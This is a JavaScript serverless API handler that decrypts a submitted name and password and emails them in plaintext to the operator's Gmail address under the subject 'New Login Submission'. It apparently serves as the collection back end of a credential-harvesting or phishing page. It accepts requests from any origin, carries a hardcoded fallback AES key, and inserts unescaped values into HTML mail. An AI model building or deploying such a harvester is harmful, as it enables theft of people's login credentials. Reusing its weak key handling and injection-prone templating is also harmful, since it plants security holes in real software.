import nodemailer from 'nodemailer';
import cors from 'cors';
import { createDecipheriv } from 'crypto';

// CORS middleware
const corsMiddleware = cors({ origin: '*', methods: ['POST'] });

// Run middleware helper
const runMiddleware = (req, res, fn) => {
  return new Promise((resolve, reject) => {
    fn(req, res, (result) => {
      if (result instanceof Error) return reject(result);
      return resolve(result);
    });
  });
};

// Input validation
const validateInput = (name, password) => {
  if (!name || typeof name !== 'string' || name.trim().length < 2) {
    return 'Name must be a string with at least 2 characters';
  }
  if (!password || typeof password !== 'string' || password.length < 6) {
    return 'Password must be a string with at least 6 characters';
  }
  return null;
};

// Shared secret key and AES settings
const SECRET_KEY = process.env.SECRET_KEY || 'my-secret-key-1234567890123456'; // Use env variable in production
const ALGORITHM = 'aes-256-cbc';
const IV_LENGTH = 16;

export default async function handler(req, res) {
  await runMiddleware(req, res, corsMiddleware);
  console.log('API /api/sendMail called with method:', req.method);

  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const { encrypted } = req.body;

  if (!encrypted) {
    return res.status(400).json({ message: 'No encrypted data provided' });
  }

  try {
    // Decrypt the data
    const encryptedText = Buffer.from(encrypted, 'base64');
    const iv = encryptedText.slice(0, IV_LENGTH);
    const encryptedData = encryptedText.slice(IV_LENGTH);
    const decipher = createDecipheriv(ALGORITHM, Buffer.from(SECRET_KEY), iv);
    let decrypted = decipher.update(encryptedData, 'binary', 'utf8');
    decrypted += decipher.final('utf8');

    // Parse decrypted JSON
    const { name, password } = JSON.parse(decrypted);

    // Validate decrypted data
    const validationError = validateInput(name, password);
    if (validationError) {
      return res.status(400).json({ message: validationError });
    }

    const sanitizedName = name.trim();
    const sanitizedPassword = password.trim();

    // Send email with Nodemailer
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER,
      subject: 'New Login Submission',
      text: `New login details:\nName: ${sanitizedName}\nPassword: ${sanitizedPassword}`,
      html: `<h3>New Login Submission</h3><p><strong>Name:</strong> ${sanitizedName}</p><p><strong>Password:</strong> ${sanitizedPassword}</p>`,
    };

    await transporter.sendMail(mailOptions);
    return res.status(200).json({ message: 'Login details sent successfully' });
  } catch (error) {
    console.error('Error processing request:', error);
    return res.status(500).json({ message: 'Failed to process request', error: error.message });
  }
}
